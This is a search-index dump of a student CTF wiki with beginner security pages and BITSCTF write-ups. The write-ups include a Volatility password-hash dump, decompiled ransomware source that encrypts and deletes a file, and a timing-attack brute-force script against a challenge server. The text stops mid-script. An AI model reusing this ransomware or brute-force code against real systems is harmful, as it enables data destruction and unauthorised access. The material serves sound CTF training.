{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to Cryptonite Wiki","text":""},{"location":"#introduction","title":"Introduction","text":"<p>This wiki is hosted by Cryptonite, the ethical hacking student project of Manipal Institute of Technology. It is aimed to give beginners an overview about the different areas of cybersecurity and CTF\u2019s.</p>"},{"location":"#motivation-for-team-cryptonite","title":"Motivation for team Cryptonite","text":"<p>Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks and knowledge in this area can reduce the chances of your data being stolen and misused. The team works in the field of ethical hacking and cybersecurity. Our areas of focus are cryptography, forensics, research, reverse engineering and web exploitation. We strive to have a deeper understanding of traditional methods and techniques in cybersecurity and their implications in today\u2019s world.</p>"},{"location":"#what-is-a-ctf","title":"What is a CTF ?","text":"<p>CTF (Capture The Flag) is an information security competitions.It involves solving challenges based on different areas of cybersecurity. CTF\u2019s can help beginners get an idea about the world of cybersecurity and help experts practice their skills.</p>"},{"location":"#the-contents-of-this-wiki","title":"The contents of this wiki","text":"<p>This wiki consists of basic information about the different areas of cybersecurity like</p> <ul> <li>Reverse Engineering</li> <li>Binary Exploitation</li> <li>Cryptography</li> <li>Web Exploitation</li> <li>Forensic Analysis</li> <li>Hardware</li> </ul> <p>This wiki will hopefully provide necessary resources for a beginner to get started in the areas of cybersecurity and will help in getting better at CTF\u2019s.</p>"},{"location":"#cryptonite-archive","title":"Cryptonite archive","text":"<p>We have an archive where you can practice challenges from past ctfs that we conducted.</p>"},{"location":"attackDefense/","title":"Attack Defense","text":""},{"location":"attackDefense/#what-is-attack-and-defense-ctf","title":"What is Attack and Defense CTF?","text":"<p>Attack and Defense CTF is a type of CTF where contending teams look for security flaws in the services run by the opposition teams. Each side seeks to identify weaknesses in the services of the opposing team while defending its own, hence the term \"attack/defense\".</p> <p>Once a team finds a vulnerability in the service that they're running, the team should exploit it on their own server(s) while simultaneously patching the hole on the servers of the opposing team(s).</p> <p></p> <p>Attack and Defense CTFs are similar to Penetration testing.</p>"},{"location":"attackDefense/#penetration-testing","title":"Penetration Testing","text":"<p>What is Penetration Testing?</p> <p>A penetration test, simulates a cyberattack on your computer system to look for weaknesses that could be exploited. Insights provided by the penetration test can be used to patch detected vulnerabilities.</p> <p>Types of Penetration Testing</p> <ol> <li> <p>Network Penetration Testing     Network Penetration Testing searches for vulnerabilities in the network infrastructure such as firewalls, serves and switches.</p> </li> <li> <p>Web Application Penetration Testing     Network Penetration Testing finds vulnerabilities in Web-applications. It is a 3-step process:</p> <ol> <li>Reconnaissance : Finding information about the Web-applications such as the servers being used, operating system,       services, etc.</li> <li>Discovery : Finding the vulnerability in the application and planning the attack vector to be used.</li> <li>Attack : Exploiting the vulnerability to gain unautherized access.</li> </ol> </li> <li> <p>Wireless Penetration Testing     Wireless penetration testing is used to identify risks associated with Wireless communications services.</p> </li> <li> <p>Physical Penetration Testing     Physical penetration testing can assist in protecting an organization's physical assets from threats such credential cloning, tailgating and social engineering. </p> </li> <li> <p>Social Engineering Penetration Testing     Users are a prominent target for attackers and are frequently seen as the weakest link in the security chain. Social engineering penetration testing focuses on the organization's people, processes, and security vulnerabilities.</p> </li> <li> <p>Client-Side Penetration Testing     Software operating on client machines, such as web browsers, media players, and content creation software suites, may have security flaws that can be found via client-side penetration testing techniques.</p> </li> </ol>"},{"location":"attackDefense/#resources","title":"Resources","text":"<p>https://tryhackme.com/ has a lot of rooms to practice different skills with respect to penetration testing. Here are our picks to get you started: 1. https://tryhackme.com/room/linuxfundamentalspart1 2. https://tryhackme.com/room/linuxfundamentalspart2 3. https://tryhackme.com/room/whatisnetworking 4. https://tryhackme.com/room/basicpentestingjt 5. https://tryhackme.com/module/network-security</p>"},{"location":"basics/","title":"Basics","text":"<p>Cybersecurity is a vast ocean. You can hack anything, from a kitchen stove to a mobile phone. If you are ambitious enough, even a rocket or a nuclear power plant. The point is that anything can be hacked, and keeping \u2018anything\u2019 secure is vague and awesome. Cybersecurity touches every domain, from IoT to networks and everything in between. People can be hacked using social engineering\u2026.</p> <p>So kudos on being brave enough to apply here. Whether you make it into the team or not, we want you to fall in love with the  beauty of all things code! By reassembling, rebuilding and breaking and staring at your screen for hours, feeling tempted to  crash your computer in the wall(because of stupid assembly code) is how you will do so.</p> <p>If that last statement was scary, ignore it and join us on a #include journey and hack your way through life. <p>This is an itty-bitty guide that might come in handy whether you are a beginner or not. The author put in a huge chunk of her Sunday afternoon writing this and will accept gratitude in the form of chocolates. </p> <p>Jokes aside, here goes:</p> <ol> <li> <p>Learn to code. Choose between C++ and Python or go rogue and do Rust if you want.</p> <ul> <li>If you are a beginner, try out https://checkio.org/ for python. </li> <li>Solve questions on leetcode, in the language of your choice on a regular basis. Atleast digest one question daily.</li> <li>Go through Youtube videos, code out a question and go through terminologies that you don\u2019t understand.</li> <li>Also remember, that you will never know everything. Just keep coding daily. Don't worry about finishing a course and then     mastering a language. Trust me, a course won\u2019t help with that, but regular, daily practice, for just about 5 minutes a day, will.</li> </ul> </li> <li> <p>Figure out Linux</p> <ul> <li>Read up on the following terms: Operating System, Windows, Linux, Unix, open-source technologies, dual booting, virtual machines, WSL.</li> <li>Do either of the following if you are a Windows user:<ul> <li>Easiest option for Windows -&gt; WSL</li> <li>Install a virtual machine </li> <li>Dual Boot</li> </ul> </li> <li>Check out overthewire bandit to learn basic Linux commands. Don\u2019t worry. It\u2019s just a fun game to get acquainted with comands. Watch John Hammond\u2019s videos if you get stuck and just google anything you don\u2019t understand</li> <li>Make an account on PicoCTF and solve all the general skills questions</li> <li>Figure out what man pages are and read up on how to navigate them.</li> </ul> </li> <li> <p>CTF</p> <ul> <li>A fun game to learn about cybersecurity, scour through documentation and write neat code that does hot stuff!</li> <li>Start out with picoCTF. Try solving as many challenges as possible.</li> <li>Then check out CTF contests on CTFTime and solve them for fun.</li> <li>Fall in love with a domain and perfect your skills in them. </li> <li>There are at least 6 notable ones:<ul> <li>Cryptography</li> <li>Web Exploitation</li> <li>Forensics </li> <li>Binary Exploitation</li> <li>Attack and Defense</li> </ul> </li> </ul> </li> </ol>"},{"location":"binexp/","title":"Binary Exploitation","text":""},{"location":"binexp/#shellcode","title":"Shellcode","text":"<p>x86 assembly in byte form typically given as payload to a vulnerable program to be executed.</p>"},{"location":"binexp/#buffer-overflow","title":"Buffer Overflow","text":"<p>Typically, an insecure input function such as gets() may allow the user to modify data beyond the allowed boundaries of the memory area and potentially be able to overwrite data or even redirect program flow.</p>"},{"location":"binexp/#implications-of-buffer-overflow","title":"Implications of Buffer Overflow","text":"<ul> <li>Data already pushed to the stack can be overwritten causing incorrect or unintended behaviour.</li> <li>When a function is called, it will push a return address to the stack before setting up the stack frame. This is so that when the function is done, this return address is popped back into the EIP/RIP register to resume the caller function to continue its work. Corrupting this pushed return address will allow us to arbitrarily execute another function or executable region.</li> <li>As an extension of the previous point, we can use so called ROP gadgets to develop even more complex control flow. This is called return oriented programming.</li> <li>In some more exotic cases, the attacker may target the pushed EBP/RBP to switch to another entirely different stack of his choosing once the function returns. This is referred to as stack pivoting.</li> </ul>"},{"location":"binexp/#mitigations","title":"Mitigations","text":"<ul> <li>Stack canary: At runtime, a randomized stack cookie is added after the stack frame. If this cookie gets corrupted, the stack check will abruptly exit the program instead of returning. This prevents attempts at EIP/RIP control as well as return oriented programming.</li> <li>ASLR: Address space randomization randomizes the base address on every execution. Without any kind of leak, the attacker will be forced to bruteforce the base address. This can be a very large search space on 64 bit systems.</li> <li>NX or DEP: The stack is marked as non executable by default to thwart attempts at running shellcodes stored on stack.</li> </ul> <p>Format string exploit If input is passed directly to the first parameter of printf, the user can arbitrarily input format specifiers to leak data or even overwrite them. </p>"},{"location":"binexp/#heap-corruption","title":"Heap corruption","text":"<p>This deals with exploiting the heap allocators and corrupting the heap structures. Heap allocators tend to have a lot of attack vectors as developers have to settle for a compromise between security and performance. Typically, we will be dealing with GLIBC\u2019s allocators on Linux.</p> <p>When a memory is freed after being malloc\u2019d, this chunk gets move to a bin depending on its size. Well known ones include TCache, Fastbin, smallbin, largebin and unsorted. These bins are used to track deallocated chunks for reuse when more memory gets allocated in the future.</p>"},{"location":"binexp/#general-heap-corruption-techniques","title":"General Heap corruption techniques","text":"<ul> <li>Use after free: The user has access to memory chunk even after it has been freed. This chunk can be manipulated before it gets reused after a subsequent malloc, causing unintended behaviour if memory is not zeroed out. It can even allow for altering the heap bin structure entirely. For example, the next pointer of tcache chunk can be overwritten to arbitrarily allocate a non heap memory chunk.</li> <li>Double free: A chunk is freed twice, usually causing this chunk to be tracked in the list of freed chunks twice. The same chunk can get allocated in two different regions.</li> </ul> <p>Many mitigations have been implemented in recent GLIBC version though there are far too many to list.</p>"},{"location":"bitsctf/","title":"Writeups","text":""},{"location":"bitsctf/#bitsctf-writeups","title":"BITSCTF Writeups","text":""},{"location":"bitsctf/#-cryptography-challenges","title":"- Cryptography Challenges","text":""},{"location":"bitsctf/#baby-rsa","title":"### Baby RSA","text":""},{"location":"bitsctf/#description","title":"Description","text":"<p>RSA is for babies. So we improved it by taking it to the next dimension.</p>"},{"location":"bitsctf/#solution","title":"Solution","text":"<p>Putting <code>n</code> in dcode.fr gives <code>p</code> and <code>q</code>: <pre><code>p = 142753777417406810805072041989903711850167885799807517849278708651169396646976000865163313860950535511049508198208303464027395072922054180911222963584032655378369512823722235617080276310818723368812500206379762931650041566049091705857347865200497666530004056146401044724048482323535857808462375833056005919409\nq = 161374151633887880567835370500866534479212949279686527346042474641768055324964720409600075821784325443977565511087794614167314642076253331252646071422351727785801273964216434051992658005517462757428567737089311219316483995316413254806332369908230656600378302043303884997949582553596892625743238461113701189423\n</code></pre>  Reference for matrix RSA decryption: https://www.researchtrend.net/ijet/pdf/13%20%20Matrix%20Modification%20of%20RSA%20Public%20Key%20Cryptosystem%20and%20its%20Variant%20Manju%20Sanghi%203513.pdf </p> <pre><code>phi = (p**2 -1)*(q**2 - 1)\nd = pow(e, -1, phi)\n\n###ct contains the given ciphertext output\nc = matrix(Zmod(n), [[ct[0], ct[1]], [ct[2], ct[3]]])\npt = c ^ d\n\nflag = b''\nfor row in pt:\n    for ele in row:\n        flag += long_to_bytes(int(ele))\nprint(flag)\n</code></pre>"},{"location":"bitsctf/#flag","title":"### Flag","text":"<p><code>BITSCTF{63N3r41_11N34r_6r0UP_C4ND0_4NY7H1N6}</code></p>"},{"location":"bitsctf/#not-suspicious-agency","title":"Not Suspicious Agency","text":""},{"location":"bitsctf/#description_1","title":"Description","text":"<p>The Not Suspicous Agency has created a very secure way to encrypt your messages that only trusted individuals can decrypt. Trust is very important after all.</p>"},{"location":"bitsctf/#solution_1","title":"Solution","text":"<p>Reference for Dual_EC_DRBG: https://www.youtube.com/watch?v=nybVFJVXbww  <code>P</code> and <code>Q</code> are  nistp256 points. <code>e</code> referenced in the video is what we have in <code>backdoor.txt</code>. We can check that <code>Q = eP</code>. So, we recover <code>rQ</code> by bruteforce, and multiply it by inverse of <code>e</code> to get the state <code>s</code>.  <code>einv * (r * Q) = einv * (r * e * P) = einv * e * (rP) = rP and s = rP.x</code> </p> <pre><code>def find_y_square(x):\n    a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc\n    b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b\n    y2 = (pow(x, 3, p) + a * x + b) % p\n    return y2\n\ne = 106285652031011072675634249779849270405\nn = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551\np = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff\n\ntrunc_rQ = strxor(test_op, test_str)[:30]\n\nflag = False\nfor i in range (256):\n    for j in range (256):\n        b1 = long_to_bytes(i)\n        b2 = long_to_bytes(j)\n        rQx = bytes_to_long(b1 + b2 + trunc_rQ)\n        ysq = int(find_y_square(int(rQx)))\n        try:\n            y = pow(ysq, (p + 1) // 4, p)\n            Z = ECC.EccPoint(rQx, y, curve='p256')\n            einv = pow(e, -1, n)\n            rP = einv * Z\n            s2 = int(rP.x)\n            g2 = generate(P, Q, s2)\n            pt = encrypt(g2, test_op[-5:])\n            if pt == b'gging':\n                print(pt)\n                pt = encrypt(g2, flag_op)\n                print(pt)\n                flag = True\n        except:\n            pass\n        if flag:\n            break\n    if flag:\n        break\nif not flag:\n    print(\"not found\")\n</code></pre>"},{"location":"bitsctf/#flag_1","title":"Flag","text":"<p><code>BITSCTF{N3V3r_811ND1Y_7rU57_574ND4rD5}</code></p>"},{"location":"bitsctf/#-dfir-challenges","title":"- DFIR Challenges","text":""},{"location":"bitsctf/#dfir","title":"DFIR","text":"<p>DFIR or Digital Forensics and Incident Response is a field within cybersecurity that focuses on the identification, investigation, and remediation of cyberattacks. </p> <p>We are provided with three files - memdump.mem, trace.pcap and artifacts.ad1</p>"},{"location":"bitsctf/#access-granted","title":"Access Granted!","text":"<p>Description: First things first. MogamBro is so dumb that he might be using the same set of passwords everywhere, so lets try cracking his PC's password for some luck.</p> <p>Given that Mogambro reuses his password for many things, we can just find his user password. This can be achieved by dumping user hashes from memdump</p> <pre><code>$ python3 vol.py -f memdump.mem windows.hashdump\n\nVolatility 3 Framework 2.4.2\nProgress:  100.00       PDB scanning finished                          \nUser    rid lmhash  nthash\n\nAdministrator   500 aad3b435b51404eeaad3b435b51404ee    8a320467c7c22e321c3173e757194bb3\nGuest   501 aad3b435b51404eeaad3b435b51404ee    31d6cfe0d16ae931b73c59d7e0c089c0\nDefaultAccount  503 aad3b435b51404eeaad3b435b51404ee    31d6cfe0d16ae931b73c59d7e0c089c0\nWDAGUtilityAccount  504 aad3b435b51404eeaad3b435b51404ee    74d0db3c3f38778476a44ff9ce0aefe2\nMogamBro    1000    aad3b435b51404eeaad3b435b51404ee    8a320467c7c22e321c3173e757194bb3\n</code></pre> <p>This hash is easily cracked...</p> <p></p>"},{"location":"bitsctf/#flag-bitsctfadolfhitlerrulesallthepeople","title":"Flag: BITSCTF{adolfhitlerrulesallthepeople}","text":""},{"location":"bitsctf/#069-day","title":"0.69 Day","text":"<p>Description: MogamBro was using some really old piece of software for his daily tasks. What a noob! Doesn't he know that using these deprecated versions of the same leaves him vulnerable towards various attacks! Sure he faced the consequences through those spam mails. <p>Can you figure out the CVE of the exploit that the attacker used to gain access to MogamBro's machine &amp; play around with his stuff.</p> <p>Looking at the processes with pstree and cmdline plugins of volatility we observe that Mogambro mainly used Winrar, Outlook and Skype... </p> <p>These set of instruction look very suspicious. <pre><code>8436    WinRAR.exe  \"C:\\Program Files\\WinRAR\\WinRAR.exe\" \"C:\\Users\\MogamBro\\Downloads\\Follow-these-instructions.zip\"\n1468    cmd.exe C:\\Windows\\system32\\cmd.exe  /K \"C:\\Users\\MogamBro\\AppData\\Local\\Temp\\Rar$DIa8436.27164\\steps.pdf .bat\"   \n780 conhost.exe \\??\\C:\\Windows\\system32\\conhost.exe 0x4\n8652    chrome.exe  Required memory at 0xb149572020 is not valid (process exited?)\n3724    notepad.exe notepad.exe  secret.png.enc \n</code></pre> This can be looked on further by analysis the artifacts.af1 in FTK Imager.. ..</p> <p></p> <p>Note: Mounting the evidence item directly greatly helps in searching and browsing for files..</p> <p></p> <p>follow-these-instructions.zip in <code>C:/Mogambro/Downloads/</code>  folder.. looking into the zip file we see that it has a steps.pdf file as well as steps.pdf folder containing a .bat file of similar name...  Googling a bit, we come across <code>CVE-2023-38831</code> that closely resembles this..</p> <p></p>"},{"location":"bitsctf/#flag-bitsctfcve-2023-38831","title":"Flag: BITSCTF{CVE-2023-38831}","text":""},{"location":"bitsctf/#mogambros-guilty-pleasure","title":"MogamBro's guilty pleasure","text":"<p>Description: MogamBro was spammed with a lot of emails, he was able to evade some but fell for some of them due to his greed. Can you analyze the emails &amp; figure out how he got scammed, not once but twice!</p> <p>We need to look for spam mails, mainly eml files. In artifacts.ad1, at path <code>C:/Mogambro/Documents/Outlook</code> we find two spam mails..  On first glance they just look like any other spam mails..   Spammimic might be used to encode a secret message in the mail.. yep.</p> <p> </p>"},{"location":"bitsctf/#flag-bitsctfsp4m_2_ph1sh_u","title":"Flag: BITSCTF{sp4m_2_ph1sh_U}","text":""},{"location":"bitsctf/#im-wired-in","title":"I'm wired in","text":"<p>Description: MogamBro got scared after knowing that his PC has been hacked and tried to type a SOS message to his friend through his 'keyboard'. Can you find the contents of that message, obviously the attacker was logging him!</p> <p>Mogambro suspects that he is being keylogged.. We look for any files with keyword key or any pcap files..</p> <p>There's simply a keylog.pcap at <code>C:/Mogambro/Desktop</code> having usb traffic... </p> <p></p> <p>True enough, HID data seems to have keylog information.. </p> <p>Using this table, we can decode the HID Data...  I like to do it manually, after applying filters.. but obviously scripts can be used...</p> <p>Decoded data... <pre><code>I have been haked !!!\nHELP ME \nBITSCTF{I_7h1nk_th3y_4Re_k3yl0991ng_ME!}\n\n~ Mogambro\n</code></pre></p> <p>Always fun.</p>"},{"location":"bitsctf/#flag-bitsctfi_7h1nk_th3y_4re_k3yl0991ng_me","title":"Flag: BITSCTF{I_7h1nk_th3y_4Re_k3yl0991ng_ME!}","text":""},{"location":"bitsctf/#bypassing-transport-layer","title":"Bypassing Transport Layer","text":"<p>Description: The exploit not only manipulated MogamBro's secret but also tried to establish an external TCP connection to gain further access to the machine. But I don't really think he was able to do so. Can you figure out where the exploit was trying to reach to?</p> <p>We have a trace.pcap file that we haven't used yet. Checking network statistics and resolved addresses... Mogambro has umm went to some sussy shady sites.. uhm ..yea. Well, I guess the ads were enough to populate the pcap file.</p> <p>Anyways at time <code>794 seconds</code>  we see pastebin being visited.. but since traffic is encrypted we can't get more information.</p> <p>Luckily, in previous question along with keylog.pcap we found keys file at <code>C:/Mogambro/Desktop</code>. Using this file, as the secret log file...</p> <p></p> <p>We can see pastebin link <code>https://pastebin.com/mPvzn0AD</code> that we found earlier in .bat file.. but the post has already been removed... Following the TCP stream though, after a little search, we find the flag..</p> <p></p>"},{"location":"bitsctf/#flag-bitsctfste4l1ng_pr1v47e_key5_ez","title":"Flag: BITSCTF{Ste4l1ng_pr1v47e_key5_ez:)}","text":""},{"location":"bitsctf/#lottery","title":"Lottery","text":"<p>Description: Now that you know the CVE, figure out how the attacker crafted the payload &amp; executed it to compromise the 'secret'. We must get secret.png. We have come across lottery already in C:/Mogambro/Downloads.</p> <p>Let's try to run this file in windows.</p> <pre><code>&gt; .\\lottery.exe\nTraceback (most recent call last):\n  File \"lottery.py\", line 34, in &lt;module&gt;\n  File \"lottery.py\", line 17, in encrypt_file\nFileNotFoundError: [Errno 2] No such file or directory: 'secret.png'\n[26248] Failed to execute script 'lottery' due to unhandled exception!\n</code></pre> <p>This error code resembles python, meaning this file is a python to executable program. we can revert this to .pyc files by using <code>pyinstxtractor</code> </p> <pre><code>&gt; python .\\pyinstxtractor.py .\\lottery.exe\n[+] Processing .\\lottery.exe\n[+] Pyinstaller version: 2.1+\n[+] Python version: 3.8\n[+] Length of package: 9008682 bytes\n[+] Found 122 files in CArchive\n[+] Beginning extraction...please standby\n[+] Possible entry point: pyiboot01_bootstrap.pyc\n[+] Possible entry point: pyi_rth_pkgutil.pyc\n[+] Possible entry point: pyi_rth_inspect.pyc\n[+] Possible entry point: pyi_rth_multiprocessing.pyc\n[+] Possible entry point: pyi_rth_setuptools.pyc\n[+] Possible entry point: pyi_rth_pkgres.pyc\n[+] Possible entry point: lottery.pyc\n[+] Found 356 files in PYZ archive\n[+] Successfully extracted pyinstaller archive: .\\lottery.exe\n\nYou can now use a python decompiler on the pyc files within the extracted directory\n</code></pre> <p>Now we can use <code>pycdc</code> to get the .pyc file as it's original .py code</p> <pre><code>\u2514\u2500$ pycdc lottery.pyc\n### Source Generated with Decompyle++\n### File: lottery.pyc (Python 3.8)\n\nimport os\nimport tempfile\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\n\ndef generate_key():\n    key = os.urandom(32)\n    fp = tempfile.TemporaryFile('w+b', False, **('mode', 'delete'))\n    fp.write(key)\n    return key\n\n\ndef encrypt_file(file_path, key):\nUnsupported opcode: BEGIN_FINALLY\n    iv = b'urfuckedmogambro'\n### WARNING: Decompyle incomplete\n\nif __name__ == '__main__':\n    key = generate_key()\n    file_path = 'secret.png'\n    encrypt_file(file_path, key)\n    print('Dear MogamBro, we are fucking your laptop with a ransomware &amp; your secret image is now encrypted! Send $69M to recover it!')\n</code></pre> <p>Couple of code wasn't reverted, we can use <code>pycdas</code> to get all the python bytecode and give both this and that to chatgpt and tell it to generate the whole python code for us, end result we get the python code</p> <pre><code>import os\nimport tempfile\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\n\ndef generate_key():\n    key = os.urandom(32)\n    fp = tempfile.TemporaryFile('w+b', False, **{'mode': 'delete'})\n    fp.write(key)\n    return key\n\ndef encrypt_file(file_path, key):\n    iv = b'urfuckedmogambro'\n    with open(file_path, 'rb') as file:\n        data = file.read()\n        padded_data = pad(data, AES.block_size)\n\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    encrypted_data = cipher.encrypt(padded_data)\n\n    with open(file_path + '.enc', 'wb') as encrypted_file:\n        encrypted_file.write(encrypted_data)\n\n    os.remove(file_path)\n\nif __name__ == '__main__':\n    key = generate_key()\n    file_path = 'secret.png'\n    encrypt_file(file_path, key)\n    print('Dear MogamBro, we are fucking your laptop with a ransomware &amp; your secret image is now encrypted! Send $69M to recover it!')\n</code></pre> <p>In the same folder we have the .enc file. Now we just need to reverse engineer this script to get our original .png, but there is key that we require. <code>urandom</code> is nearly impossible to reverse but the key is being stored at a temporary location, we know that the key is 32 bytes meaning the tempfile is also 32 bytes. Let's mount the image and search for a 32 byte file in the whole drive.</p> <p></p> <pre><code>PS D:\\&gt; Get-ChildItem -Path . -Recurse | Where-Object { $_.Length -eq 32 }\n\n\n    Directory: D:\\MogamBro\\AppData\\Local\\Temp\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        15-02-2024     22:03             32 tmpd1tif_2a\n</code></pre> <p>This is the tempfile we need, we have the key, the iv and the cipher file. Now we write a script to decrypt the AES encryption.</p> <pre><code>from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend\nimport os\n\ndef decrypt_aes_cbc(file_path, key, iv):\n    with open(file_path, 'rb') as encrypted_file:\n        ciphertext = encrypted_file.read()\n\n    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())\n    decryptor = cipher.decryptor()\n    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()\n\n    return decrypted_data\n\ndef save_decrypted_png(decrypted_data, output_path):\n    with open(output_path, 'wb') as decrypted_file:\n        decrypted_file.write(decrypted_data)\n\ndef main():\n    ### Provide the file path, AES key, and IV\n    encrypted_file_path = 'path/to/encrypted_file.png'\n    output_file_path = 'path/to/decrypted_file.png'\n    aes_key = b'your_aes_key_here'  ### 16, 24, or 32 bytes depending on AES key size (128, 192, or 256 bits)\n    iv = b'your_iv_here'  ### 16 bytes\n\n    decrypted_data = decrypt_aes_cbc(encrypted_file_path, aes_key, iv)\n    save_decrypted_png(decrypted_data, output_file_path)\n\n    print(\"File decrypted successfully!\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>we get the initial image</p> <p></p> <p>Flag: <code>BITSCTF{1_r3c3ived_7h3_b0mbz}</code></p>"},{"location":"bitsctf/#-forensics-challenges","title":"- Forensics Challenges","text":""},{"location":"bitsctf/#challenge","title":"CHALLENGE:","text":"<p>rskbansal hacked into nasa mainframe and intercepted a radio signal from deep space along with a very SUS image.  He tried using data representation but soon realised that he seems to be missing something...Help him figure out the secret!!!  HINT: skbansal asked Huffman for help, he suggested to maybe try messing around with histograms.</p>"},{"location":"bitsctf/#solve","title":"SOLVE:","text":"<p>The challenge description mentions 'deep space' which hints at using DeepSound for analyzing the wav file.  On putting the secret.wav in DeepSound, we get a secret.zip file </p> <p>The zip file required a password to unzip. On using sstv on the wav file, we obtain the password of the zip file as 'mogambro'  On entering the password, the zip file gave two pkl files: enc_data.pkl and temp.pkl  The hint mentioned Huffman and histograms. Searching steganography techniques using Huffman and histograms I came across the below GitHub repo: </p> <p>https://github.com/TejveerSingh13/Image-Steganography </p> <p>The link contains a README file which has a youtube link along with written instructions as to how to use the attached python files that contain the actual working code for the Huffman Encoding and Compression algorithm. </p> <p>On using the enc.png file and enc_data.pkl along with the decode option in the histo-shift.py code, we get a text file with a bunch of binary numbers. Now this text file and the tempo.pkl file need to be used in the huffman.py code which gives another text file that contains the decoded flag.</p> <p>FLAG: bitsctf{s73g4n06r4phy_15_n07_45_345y_45_17_533m5}</p>"},{"location":"bitsctf/#-osint-challenges","title":"- Osint Challenges","text":""},{"location":"bitsctf/#challenge_1","title":"CHALLENGE:","text":"<p>Sir-Steals-A-Lot is a world famous art thief. Lately he stole this painting. When he was caught he claimed to have done it because the painting commemorates the location of the crowned glory of his lady love. They fell in love in her hometown but her grandfather wouldn't let her marry a thief like him.!  Answer is the meaning of his LadyLove's last name. Wrap the answer in the flag. Example :BITSCTF{your_answer} HINT: 16th February 2024 is his LadyLove's 111th birthday (if she were still alive)  </p>"},{"location":"bitsctf/#solve_1","title":"SOLVE:","text":"<p>On searching for the image online, we find that the painting is called  'Landscape from Spa' by Peter Adolf Hall in the website given below. https://reasonator.toolforge.org/?lang=en&amp;q=18546305 </p> <p>This hints that the LadyLove's 'crowning' took place in Spa, a place in Belgium. The hint told us that 16th February 1913 is the LadyLove's birthday. On searching for people with birthdays on the date we come across Keriman Ece According to https://en.wikipedia.org/wiki/Keriman_Halis_Ece : Keriman Halis Ece (February 16, 1913 \u2013 January 28, 2012) was a Turkish beauty pageant titleholder, pianist, and fashion model who won the Miss Turkey 1932 title. She was also crowned Miss Universe 1932 in Spa, Belgium and thus became Turkey's first Miss Universe. </p> <p>It looks like we got the LadyLove's name. But the  flag requires the meaning of the name. On the same link above we see that her name 'Ece' means 'Queen' in Turkish. Hence the flag is: </p> <p>FLAG : BITSCTF{Queen}</p>"},{"location":"bitsctf/#-pwn-challenges","title":"- PWN Challenges","text":""},{"location":"bitsctf/#mogambros-uncertainity-principle","title":"Mogambro's uncertainity principle","text":"<p>Challenge description gives as follow</p> <p><code>MogamBro's Certainty Principle states that the more accurate you are the more delay you'll face. \u0394t \u2022 \u0394p \u2265 frustration / ram_space; where p is precission and t is time.</code></p> <p>We are given only the netcat connection, so connecting we get this result</p> <pre><code>$ nc 20.244.33.146 4445\nEnter password: h    \nIncorrect password\nTime taken:  9.888255534974642e-05\n</code></pre> <p>We are given an arbitary time taken value for a password character. After a lot of testing, wrote a script to bruteforce all ascii characters for the password. We are able to see that if the character at that position is given then the time taken value is the highest. So i wrote a script to bruteforce all characters and keep on adding them.</p> <p>After you keep bruteforcing you will finally get the passwords and after level 5 you get the flag</p> <pre><code>nc 20.244.33.146 4445\nEnter password: sloppytoppywithatwist\nCongratulations! You have unlocked the door to level 2!\nEnter password: gingerdangerhermoinegranger\nCongratulations! You have unlocked the door to level 3!\nEnter password: hickerydickerydockskibididobdobpop\nCongratulations! You have unlocked the door to level 4!\nEnter password: snickersnortsupersecureshortshakingsafarisadistic\nCongratulations! You have unlocked the door to level 5!\nEnter password: boompopwhizzleskizzleraptrapmeowbarkhowlbuzzdrumburpfartpoop\nCongratulations! You have unlocked all the doors. THe flag is BITSCTF{c0n6r47ul4710n5_0n_7h3_5ucc355ful_3n7ry}\n</code></pre> <p>Full script</p> <pre><code>from pwn import context, remote\nfrom multiprocessing import Process, Manager, Value\nimport ctypes\n\ncontext.log_level = \"ERROR\"\n\n### alphabets = \"abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ_\"\nalphabets = \"abcdefghijklmnopqrstuvwxyz\"\n\n\ndef runner(passwords, timeTakens, curPass, currentChar):\n    r = remote(\"20.244.33.146\", 4445)\n\n    for p in passwords:\n        ### print(p)\n        r.sendlineafter(b\"Enter password: \", p)\n\n    to_send = curPass.value + currentChar.encode()\n\n    try:\n        r.sendlineafter(b\"Enter password: \", to_send)\n    except EOFError:\n        print(\"EOFError\")\n        return\n\n    output = r.recvline().decode()\n    ### print(output)\n    if \"congrat\" in output.lower():\n        if \"BITSCTF\" in output:\n            print(\"\\n\\nGOT FLAG:\", output.lower())\n            ### exit() ### exit () doesn't work if inside process\n\n        print(\"\\n\\nCRACKED LEVEL\", to_send)\n        passwords.append(to_send)\n        curPass.value = b\"\"\n        r.close()\n        return\n\n    p = r.recvline().decode().strip()\n    ### print(to_send, p)\n    timeTakens[currentChar] = float(p.split(\"Time taken: \")[-1])\n\n    r.close()\n\n\npasswords_init = [\n    b\"sloppytoppywithatwist\",\n    b\"gingerdangerhermoinegranger\",\n    b\"hickerydickerydockskibididobdobpop\",\n    b\"snickersnortsupersecureshortshakingsafarisadistic\",\n]\n\ncurPass_init = \"boompopwhizzleskizzleraptrapmeowbarkhowlbuzzdrumburpfartp\"\n### curPass_init = \"\"\n\nmanager = Manager()\npasswords = manager.list()\n\np_len = len(passwords_init)\n\nfor p in passwords_init:\n    passwords.append(p)\n\ncurPass = Value(ctypes.c_char_p, curPass_init.encode())\n\nwhile True:\n    procs = []\n\n    timeTakens = manager.dict()\n\n    for alphabet in alphabets:\n        proc = Process(target=runner, args=(passwords, timeTakens, curPass, alphabet))\n        procs.append(proc)\n        proc.start()\n\n    for proc in procs:\n        proc.join()\n\n    ### print(timeTakens)\n\n    if len(passwords) == p_len:\n        try:\n            correct_letter = timeTakens.keys()[\n                timeTakens.values().index(max(timeTakens.values()))\n            ]\n            ### print(correct_letter)\n\n            curPass.value += correct_letter.encode()\n        except ValueError:\n            print(\"got flag\")\n            exit()\n    else:\n        p_len = 